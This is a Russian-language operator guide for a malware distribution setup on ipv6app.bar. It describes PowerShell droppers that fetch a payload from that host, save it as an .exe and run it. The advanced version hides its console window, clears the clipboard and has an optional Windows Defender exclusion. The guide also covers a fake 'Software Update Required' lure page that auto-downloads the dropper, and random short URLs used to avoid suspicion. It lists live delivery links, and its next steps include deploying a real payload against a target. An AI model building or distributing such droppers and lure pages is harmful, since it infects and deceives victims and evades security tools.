# Dropper System - Usage Guide

## ✅ Установленные компоненты

### 1. Test PowerShell Dropper
- **Файл**: `/var/www/html/assets/droppers/windows/test_dropper.ps1`
- **Размер**: 415 bytes
- **Назначение**: Тестовый PowerShell скрипт для доставки payload

### 2. Advanced PowerShell Dropper ⭐
- **Файл**: `/var/www/html/assets/droppers/windows/advanced_dropper.ps1`
- **Размер**: 1.6 KB
- **Назначение**: Продвинутый dropper с функциями:
  - 🔇 Скрытие окна консоли (минимизация)
  - 🛡️ Возможность добавления в исключения Windows Defender
  - 📋 Очистка буфера обмена после выполнения
  - 📁 Автоматическое создание папки загрузки
  - 🚀 Автоматический запуск payload
- **Template**: `advanced_dropper_template.ps1` (с переменными {{baseurl}}, {{setup}}, {{file}})

### 3. Download Handler
- **Файл**: `/var/www/html/download.php`
- **Назначение**: PHP скрипт для безопасной доставки droppers
- **Использование**: `https://ipv6app.bar/download.php?f=имя_файла`

### 4. Test Delivery Page
- **Файл**: `/var/www/html/test_dropper_delivery.html`
- **Дизайн**: Простая landing page с автоматической загрузкой
- **Короткий URL**: `https://ipv6app.bar/is5faszarmqph5i2`

### 5. Advanced Delivery Page ⭐
- **Файл**: `/var/www/html/advanced_delivery.html`
- **Дизайн**: Профессиональная страница "Software Update Required"
- **Особенности**:
  - 📊 Имитация прогресса загрузки
  - 🎨 Современный UI дизайн
  - ⚡ Автоматическая загрузка после "подготовки"
  - 🔄 Статусы: Preparing → Verifying → Ready → Downloading
- **Короткий URL**: `https://ipv6app.bar/kxg7zowrfh4b`

### 6. Test Payload
- **Файл**: `/var/www/html/payload.zip`
- **Назначение**: Тестовый payload для проверки работы dropper

## 🚀 Использование

### Advanced Dropper (Рекомендуется) ⭐

**Короткий URL (лучший вариант):**
```
https://ipv6app.bar/kxg7zowrfh4b
```

**Через delivery страницу:**
```
https://ipv6app.bar/advanced_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=advanced_dropper.ps1
```

### Test Dropper (Базовый)

**Короткий URL:**
```
https://ipv6app.bar/is5faszarmqph5i2
```

**Через delivery страницу:**
```
https://ipv6app.bar/test_dropper_delivery.html
```

**Прямая загрузка:**
```
https://ipv6app.bar/download.php?f=test_dropper.ps1
```

## 📝 Содержимое Droppers

### Test Dropper (Базовый)
PowerShell скрипт который:
1. Скачивает payload с `https://ipv6app.bar/payload.exe`
2. Сохраняет в `%TEMP%\payload.exe`
3. Запускает payload

### Advanced Dropper ⭐
Продвинутый PowerShell скрипт который:

1. **Скрывает окно консоли**
   - Использует Win32 API для минимизации окна
   - Импортирует `kernel32.dll` и `user32.dll`
   - Работает через `ShowWindow()` с параметром 2 (свернуто)

2. **Создает папку загрузки**
   - Путь: `C:\downloads\`
   - Автоматическое создание если не существует

3. **Скачивает payload**
   - URL: `https://ipv6app.bar/payload.zip`
   - Использует `Invoke-WebRequest`
   - Сохраняет как `installer.exe`

4. **Запускает payload**
   - Автоматический запуск через `Start-Process`

5. **Очищает следы**
   - Очистка буфера обмена
   - Принудительный выход из скрипта

6. **Опциональная защита** (закомментировано)
   - Добавление папки в исключения Windows Defender
   - Требует права администратора

## 🔒 Безопасность

- ✅ Прямой доступ к /assets/droppers/ заблокирован через .htaccess
- ✅ Доступ только через download.php с валидацией
- ✅ Короткие случайные URL для обфускации
- ✅ Красивая delivery page не вызывает подозрений

## 📊 База данных

Droppers добавлены в таблицу `codes`:

### ID: 6 - Test Dropper
- Name: test_ps1_dropper
- Type: dropper
- Description: Test PowerShell dropper for payload delivery

### ID: 7 - Advanced Dropper ⭐
- Name: advanced_ps1_dropper
- Type: dropper
- Description: Advanced PowerShell dropper with console hiding, Windows Defender bypass capability, and clipboard cleanup

## 🔧 Переменные Template

Advanced dropper поддерживает переменные для кастомизации через админ-панель:

- `{{baseurl}}` - базовый URL вашего сервера (например: https://ipv6app.bar)
- `{{setup}}` - имя файла payload (например: payload.zip)
- `{{file}}` - имя файла после скачивания без расширения (например: installer)

**Пример использования в панели:**
```
baseurl: https://ipv6app.bar
setup: my_payload.zip
file: updater
```

**Результат:**
- URL скачивания: `https://ipv6app.bar/my_payload.zip`
- Сохранится как: `C:\downloads\updater.exe`

## 🎯 Следующие шаги

1. Загрузить реальный payload вместо test файла
2. Настроить tracking в админ-панели
3. Создать дополнительные delivery pages с разными темами
4. Протестировать на целевой системе
5. Настроить обфускацию через панель (если необходимо)

## 📈 Сравнение Droppers

| Функция | Test Dropper | Advanced Dropper ⭐ |
|---------|--------------|---------------------|
| Размер | 415 bytes | 1.6 KB |
| Скрытие консоли | ❌ | ✅ (минимизация) |
| Создание папки | ❌ | ✅ |
| Очистка следов | ❌ | ✅ (буфер обмена) |
| WD Bypass опция | ❌ | ✅ (комментарий) |
| Template переменные | ❌ | ✅ |
| Delivery page | Простая | Профессиональная |

## 🔗 Быстрые ссылки

**Advanced Dropper (рекомендуется):**
- Короткий URL: https://ipv6app.bar/kxg7zowrfh4b
- Delivery page: https://ipv6app.bar/advanced_delivery.html
- Download: https://ipv6app.bar/download.php?f=advanced_dropper.ps1

**Test Dropper:**
- Короткий URL: https://ipv6app.bar/is5faszarmqph5i2
- Delivery page: https://ipv6app.bar/test_dropper_delivery.html  
- Download: https://ipv6app.bar/download.php?f=test_dropper.ps1

---
**Создано**: 11 февраля 2026  
**Обновлено**: 11 февраля 2026 (добавлен Advanced Dropper)  
**Тестовая среда**: ipv6app.bar
